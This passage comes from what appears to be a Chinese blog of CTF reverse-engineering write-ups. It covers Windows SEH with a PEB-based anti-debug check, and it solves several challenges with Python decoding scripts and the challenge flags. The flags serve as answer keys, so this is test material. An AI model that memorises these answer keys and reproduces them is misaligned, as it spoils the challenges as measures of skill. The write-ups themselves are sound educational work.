class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_EXCEPTION_DISPOSITION</span> &#123;</span><br><span class="line">    ExceptionContinueExecution, 已处理异常，从断点处继续执行</span><br><span class="line">    ExceptionContinueSearch,    未处理异常，继续搜索异常处理注册表</span><br><span class="line">    ExceptionNestedException,   OS内部使用</span><br><span class="line">    ExceptionCollidedUnwind     OS内部使用</span><br><span class="line">&#125; EXCEPTION_DISPOSITION;</span><br></pre></td></tr></table></div></figure><p>该函数会接收EXCEPTION_RECORD这个结构体来储存异常相关的信息</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_RECORD</span> &#123;</span><br><span class="line">    DWORD ExceptionCode;        <span class="comment">//异常代码</span></span><br><span class="line">    DWORD ExceptionFlags;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_RECORD</span> *ExceptionRecord;</span><br><span class="line">    PVOID ExceptionAddress;     <span class="comment">//异常发生的地址</span></span><br><span class="line">    DWORD NumberParameters;</span><br><span class="line">    ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></div></figure><p>因为SEH是线程相关的，因此为了在多线程的环境下安全运行，Handler函数还会接收一个CONTEXT结构体来保存寄存器的相关信息</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CONTEXT</span> &#123;</span><br><span class="line">    <span class="comment">//用来表示该结构中的哪些域有效</span></span><br><span class="line">     DWORD ContextFlags; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调试寄存器</span></span><br><span class="line">     DWORD   Dr0, Dr1, Dr2, Dr3, Dr6, Dr7; </span><br><span class="line">    <span class="comment">//偏移值  04h  08h  0Ch  10h  14h  18h</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//浮点寄存器区</span></span><br><span class="line">     FLOATING_SAVE_AREA FloatSave; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//段寄存器</span></span><br><span class="line">     DWORD   SegGs, SegFs, SegEs, SegDs; </span><br><span class="line">    <span class="comment">//偏移值    88h    90h    94h    98h </span></span><br><span class="line">      </span><br><span class="line">    <span class="comment">//通用寄存器组</span></span><br><span class="line">     DWORD   Edi, Esi, Ebx, Edx, Ecx, Eax; </span><br><span class="line">    <span class="comment">//偏移值  9Ch  A0h  A4h  A8h  ACh  B0h</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//控制寄存器组</span></span><br><span class="line">     DWORD   Ebp, Eip, SegCs, EFlags, Esp, SegSs; </span><br><span class="line">    <span class="comment">//偏移值  B4h  B8h    BCh     C0h  C4h    C8h</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">//扩展寄存器，只有特定的处理器才有</span></span><br><span class="line">     BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION]; <span class="comment">//512bytes</span></span><br><span class="line">&#125; CONTEXT;</span><br></pre></td></tr></table></div></figure><p>当异常发生时，执行异常代码的线程中断，转而运行SEH，而发生异常代码的地址将会储存在CONTEXT.EIP(偏移：0xB8)中。当异常处理函数执行完之后依靠CONTEXT.EIP来使得中断的线程继续执行。</p>        <h2 id="调试样例"   >          <a href="#调试样例" class="heading-link"><i class="fas fa-link"></i></a><a href="#调试样例" class="headerlink" title="调试样例"></a>调试样例</h2>      <p>seh.exe</p><p>整体代码如下</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152244842.png" alt="image-20230115224420795"></p><p>下面进一步调试分析</p><p>首先是注册异常处理函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152245031.png" alt="image-20230115224459999"></p><p>通过TEB结构体成员NtTib访问SEH链。而TEB.NtTib.ExceptionList成员为TEB结构体的第一个成员。段寄存器FS指向段内存的起始地址，TEB结构体即位于此。因此通过FS:[0]来访问SEH链并且将位于0x40105A地址的异常处理函数加入到SEH链中。</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152250845.png" alt="image-20230115225043825"></p><p>在触发了异常后，将会立即跳到位于0x40105A的异常处理函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152251857.png" alt="image-20230115225140825"></p><p>而此时的栈中已经储存了异常处理函数所需要的参数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152253786.png" alt="image-20230115225308763"></p><p>0x0019FA64 </p><p>第一个参数指向的是EXCEPTION_RECORD结构体</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152254831.png" alt="image-20230115225442803"></p><p>可以看到异常代码0xC0000005以及触发异常的地址0x00401019</p><p>0x0019FF24</p><p>第二个参数指向SEH链的起始位置，在x64dbg的SEH选项卡中可以看到</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152257302.png" alt="image-20230115225705260"></p><p>0x0019FAB4</p><p>第三个参数指向CONTEXT结构体</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152259114.png" alt="image-20230115225943085"></p><p>在B8偏移位可以找到异常触发的地址0x00401019</p><p>在进入了SEH函数后，就是反调试的代码</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152301611.png" alt="image-20230115230144578"></p><p>这里将fs:[30]指向PEB结构体，而PEB结构体0x2的地方是PEB.BeingDebugged</p><p>当程序被调试的时候，返回1</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152304236.png" alt="image-20230115230411196"></p><p>于是便打印<code>Debugger detected :(</code></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152305976.png" alt="image-20230115230544948"></p><p>最后将压入栈的参数全部出栈，删除SEH函数</p><p>删除前的栈</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152306981.png" alt="image-20230115230629953"></p><p>删除后的栈</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152306881.png" alt="image-20230115230657856"></p>        <h2 id="更加完善的异常处理"   >          <a href="#更加完善的异常处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#更加完善的异常处理" class="headerlink" title="更加完善的异常处理"></a>更加完善的异常处理</h2>      <p>在实际使用的过程中，微软提供的SEH存在不少缺陷。现在常用的基本上都是编译器的增强版，例如微软的编译器MSC里提供的__try, __finally, __except</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020_Baby_Obfuscation</title>
      <link href="/2023/01/10/NPUCTF2020-Baby-Obfuscation/"/>
      <url>/2023/01/10/NPUCTF2020-Baby-Obfuscation/</url>
      
        <content type="html"><![CDATA[        <h2 id="NPUCTF2020-Baby-Obfuscation"   >          <a href="#NPUCTF2020-Baby-Obfuscation" class="heading-link"><i class="fas fa-link"></i></a><a href="#NPUCTF2020-Baby-Obfuscation" class="headerlink" title="[NPUCTF2020]Baby Obfuscation"></a>[NPUCTF2020]Baby Obfuscation</h2>      <p>ida64位打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132202769.png" alt="image-20230110213330683"></p><p>加了混淆，不过不算很长，直接分析</p><p>首先是FOX函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132202770.png" alt="image-20230110213453876"></p><p>FOX1是gcd</p><p>因此<code>v3 = F0X1(A0X3[i_0], A0X3[i_0]);</code>即为<code>v3 = A0X3[i_0]</code></p><p>所以整体是一个<code>for(int i = 1; i &lt;= len; i++)</code>的循环</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132202771.png" alt="image-20230110213700390"></p><p>第一个if</p><p>FOX5是求a的b次方，化简可得<code>if(A0X3[i_0] + A0X3[i_0 + 1] &gt;= 4)</code></p><p>结合<code>A0X3</code>数组的初始化</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132202772.png" alt="image-20230110213825280"></p><p><code>i_0</code>的最小值为1，也就是说<code>A0X3[i_0] + A0X3[i_0 + 1]</code>的最小值为2 + 3 &#x3D; 5，因此这个if为恒真条件</p><p>再化简if里面的语句。因为<code>-a = ~a + 1</code>，因此<code>~(~a + b) == ~(-a - 1 + b) == a + 1 - b - 1 == a - b</code></p><p>因此最后化简为<code>A0X1[i_0] = input[i_0-1] - A0X4[(i_0-1) % 4]</code></p><p>第二个if</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132202773.png" alt="image-20230110214606125"></p><p>对相邻两个整数gcd，v7恒为1，而且gcd的值最小为1，因此条件恒假</p><p>第三个if</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132202774.png" alt="image-20230110214753085"></p><p>同理可得，条件恒真</p><p><code>A0X1[i_0] ^= A0X4[v16 % 4]</code></p><p>第四个if</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132202775.png" alt="image-20230110214914481"></p><p>当x&gt;0时<code>3^x &gt; x + 1</code>，因此v18 &#x3D; 0，if条件恒假</p><p>分析完毕，写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">enc = [</span><br><span class="line">    <span class="number">0x00001E79</span>, <span class="number">0x00001E79</span>, <span class="number">0x00002135</span>, <span class="number">0x0000170D</span>, <span class="number">0x00001F41</span>, <span class="number">0x00001901</span>, <span class="number">0x00002CED</span>, <span class="number">0x000011F9</span>,</span><br><span class="line">    <span class="number">0x00002649</span>, <span class="number">0x00002581</span>, <span class="number">0x00002DB5</span>, <span class="number">0x000014B5</span>, <span class="number">0x000025E5</span>, <span class="number">0x00002A31</span>, <span class="number">0x000030D5</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    x = (enc[i] - <span class="number">1</span>) // <span class="number">100</span></span><br><span class="line">    x ^= key[i%<span class="number">4</span>]</span><br><span class="line">    x += key[i%<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x&amp;<span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NPUCTF&#123;0bfu5er&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2018_2ex</title>
      <link href="/2023/01/10/CISCN2018-2ex/"/>
      <url>/2023/01/10/CISCN2018-2ex/</url>
      
        <content type="html"><![CDATA[        <h2 id="CISCN2018-2ex"   >          <a href="#CISCN2018-2ex" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2018-2ex" class="headerlink" title="[CISCN2018]2ex"></a>[CISCN2018]2ex</h2>      <p>mips，ida32位</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132219348.png" alt="image-20230110194854629"></p><p>找到关键函数，魔改base64</p><p>码表</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@,.1fgvw#`/2ehux$~\&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noD</span><br></pre></td></tr></table></div></figure><p>唯一要注意的是，题目给的输出</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">│_r-+_Cl5;vgq_pdme7#7eC0=</span><br></pre></td></tr></table></div></figure><p>前面的那个<code>│</code>是多余的，很明显在码表中也没有出现</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;change53233&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WMCTF2020_easy_re</title>
      <link href="/2023/01/10/WMCTF2020-easy-re/"/>
      <url>/2023/01/10/WMCTF2020-easy-re/</url>
      
        <content type="html"><![CDATA[        <h2 id="WMCTF2020-easy-re"   >          <a href="#WMCTF2020-easy-re" class="heading-link"><i class="fas fa-link"></i></a><a href="#WMCTF2020-easy-re" class="headerlink" title="[WMCTF2020]easy_re"></a>[WMCTF2020]easy_re</h2>      <p>ida64位</p><p>非常的混乱，找不到入手点。搜索字符串也什么都搜不到</p><p>原因出在程序的名字，perl</p><p>Perl 是高级、通用、直译式、动态的程序语言。也就是说，他的程序其实是在运行的过程中逐渐解压。在程序执行过程中会用script解压你压缩的源程序。</p><p>x64dbg搜索script然后下断点再往前走几步就到了</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132219633.png" alt="image-20230110014201614"></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;I_WAnt_dynam1c_F1ag&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GUET-CTF2019_encrypt</title>
      <link href="/2023/01/10/GUET-CTF2019-encrypt/"/>
      <url>/2023/01/10/GUET-CTF2019-encrypt/</url>
      
        <content type="html"><![CDATA[        <h2 id="GUET-CTF2019-encrypt"   >          <a href="#GUET-CTF2019-encrypt" class="heading-link"><i class="fas fa-link"></i></a><a href="#GUET-CTF2019-encrypt" class="headerlink" title="[GUET-CTF2019]encrypt"></a>[GUET-CTF2019]encrypt</h2>      <p>ida64位打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132218425.png" alt="image-20230110004331813"></p><p>输入后经过三个函数最后进行判断</p><p>第一个</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132218426.png" alt="image-20230110004408900"></p><p>很明显是rc4的生成s盒</p><p>第二个</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132218427.png" alt="image-20230110004434426"></p><p>用s盒对输入进行异或加密</p><p>第三个</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132218428.png" alt="image-20230110004459360"></p><p>魔改后的base64</p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0x5a</span>, <span class="number">0x60</span>, <span class="number">0x54</span>, <span class="number">0x7A</span>, <span class="number">0x7A</span>, <span class="number">0x54</span>, <span class="number">0x72</span>, <span class="number">0x44</span>,</span><br><span class="line">       <span class="number">0x7C</span>, <span class="number">0x66</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x5B</span>, <span class="number">0x5F</span>, <span class="number">0x56</span>, <span class="number">0x56</span>,</span><br><span class="line">       <span class="number">0x4C</span>, <span class="number">0x7C</span>, <span class="number">0x79</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x52</span>, <span class="number">0x79</span>,</span><br><span class="line">       <span class="number">0x55</span>, <span class="number">0x6D</span>, <span class="number">0x46</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0x4A</span>, <span class="number">0x67</span>,</span><br><span class="line">       <span class="number">0x4C</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x4A</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x5A</span>, <span class="number">0x70</span>,</span><br><span class="line">       <span class="number">0x48</span>, <span class="number">0x52</span>, <span class="number">0x78</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x6C</span>, <span class="number">0x48</span>, <span class="number">0x5C</span>,</span><br><span class="line">       <span class="number">0x76</span>, <span class="number">0x5A</span>, <span class="number">0x45</span>, <span class="number">0x3D</span>]</span><br><span class="line"></span><br><span class="line">h = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(enc), <span class="number">4</span>):</span><br><span class="line">    h.append(((((enc[i] - <span class="number">0x3d</span>) &amp; <span class="number">0x3f</span>) &lt;&lt; <span class="number">2</span>) | (((enc[i + <span class="number">1</span>] - <span class="number">0x3d</span>) &amp; <span class="number">0x30</span>) &gt;&gt; <span class="number">4</span>)))</span><br><span class="line">    h.append((((enc[i + <span class="number">1</span>] - <span class="number">0x3d</span>) &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>) | (((enc[i + <span class="number">2</span>] - <span class="number">0x3d</span>) &amp; <span class="number">0x3c</span>) &gt;&gt; <span class="number">2</span>))</span><br><span class="line">    h.append((((enc[i + <span class="number">2</span>] - <span class="number">0x3d</span>) &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">6</span>) | ((enc[i + <span class="number">3</span>] - <span class="number">0x3d</span>) &amp; <span class="number">0x3f</span>))</span><br><span class="line"></span><br><span class="line">key = [<span class="number">16</span>, <span class="number">32</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">16</span>, <span class="number">64</span>]</span><br><span class="line">box = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    box[i] = i</span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v8 = box[i]</span><br><span class="line">    v6 = (v6 + v8 + key[i % <span class="number">8</span>]) &amp; <span class="number">0xff</span></span><br><span class="line">    box[i] = box[v6]</span><br><span class="line">    box[v6] = v8</span><br><span class="line"></span><br><span class="line">v5 = <span class="number">0</span></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(h)):</span><br><span class="line">    v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    v7 = box[v5]</span><br><span class="line">    v6 = (v6 + v7) % <span class="number">256</span></span><br><span class="line">    v8 = box[v6]</span><br><span class="line">    box[v5] = v8</span><br><span class="line">    box[v6] = v7</span><br><span class="line">    h[i] ^= (box[(v7 + v8) % <span class="number">256</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> h:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e10adc3949ba59abbe56e057f20f883e&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2021_QQQQT</title>
      <link href="/2023/01/09/GKCTF2021-QQQQT/"/>
      <url>/2023/01/09/GKCTF2021-QQQQT/</url>
      
        <content type="html"><![CDATA[        <h2 id="GKCTF-2021-QQQQT"   >          <a href="#GKCTF-2021-QQQQT" class="heading-link"><i class="fas fa-link"></i></a><a href="#GKCTF-2021-QQQQT" class="headerlink" title="[GKCTF 2021]QQQQT"></a>[GKCTF 2021]QQQQT</h2>      <p>exeinfo pe打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132217623.png" alt="image-20230109233159244"></p><p>如果不处理的话直接用ida打开有很多函数都是红的</p><p>用EnigmaVBUnpacker处理，ida打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132217624.png" alt="image-20230109233931322"></p><p>找到关键函数，猜测是base58</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12t4tww3r5e77&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2019Who_is_he</title>
      <link href="/2023/01/09/SCTF2019_Who_is_he/"/>
      <url>/2023/01/09/SCTF2019_Who_is_he/</url>
      
        <content type="html"><![CDATA[        <h2 id="SCTF2019-Who-is-he"   >          <a href="#SCTF2019-Who-is-he" class="heading-link"><i class="fas fa-link"></i></a><a href="#SCTF2019-Who-is-he" class="headerlink" title="[SCTF2019]Who is he"></a>[SCTF2019]Who is he</h2>      <p>dnspy打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132217105.png" alt="image-20230109230402587"></p><p>发现是先DES再base64</p><p>不过要留意在在C#中，字符串默认是Unicode</p><p>在下面的encryptKey和EncryptData中可以找到密文和key，不过这是假flag</p><p>用dnspy调试断点也打不下去，参考别的师傅的博客，用的是CE</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132217106.png" alt="image-20230109231811799"></p><p>直接就找到了</p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#这是假的</span></span><br><span class="line">enc = <span class="string">&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;</span></span><br><span class="line">key = <span class="string">b&#x27;1\x002\x003\x004\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">des = DES.new(key, DES.MODE_CBC, iv=key)</span><br><span class="line">dec = des.decrypt(base64.b64decode(enc))</span><br><span class="line"><span class="built_in">print</span>(dec.decode(<span class="string">&#x27;utf16&#x27;</span>))</span><br><span class="line"><span class="comment">#这是真的</span></span><br><span class="line">enc1 = <span class="string">&quot;xZWDZaKEhWNMCbiGYPBIlY3+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/40nbU=&quot;</span></span><br><span class="line">key1 = <span class="string">b&#x27;t\x00e\x00s\x00t\x00&#x27;</span></span><br><span class="line">aaa = DES.new(key1, DES.MODE_CBC, iv=key1)</span><br><span class="line">ddd = aaa.decrypt(base64.b64decode(enc1))</span><br><span class="line"><span class="built_in">print</span>(ddd.decode(<span class="string">&#x27;utf16&#x27;</span>))</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;She_P1ay_Black_Hole_Very_Wel1!LOL!XD!&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF2019_babyvm</title>
      <link href="/2022/12/20/GWCTF2019-babyvm/"/>
      <url>/2022/12/20/GWCTF2019-babyvm/</url>
      
        <content type="html"><![CDATA[        <h2 id="GWCTF-2019-babyvm"   >          <a href="#GWCTF-2019-babyvm" class="heading-link"><i class="fas fa-link"></i></a><a href="#GWCTF-2019-babyvm" class="headerlink" title="[GWCTF 2019]babyvm"></a>[GWCTF 2019]babyvm</h2>      <p>ida64打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132216157.png" alt="image-20221220114220125"></p><p>输出后进入初始化函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132216158.png" alt="image-20221220114251602"></p><p>猜测大概是虚拟机，进一步分析</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132216159.png" alt="image-20221220114340803"></p><p>有四个寄存器</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132216160.png" alt="image-20221220114358175"></p><p>然后是check函数，提示暂且不管</p><p>找到opcode就可以写脚本了</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td 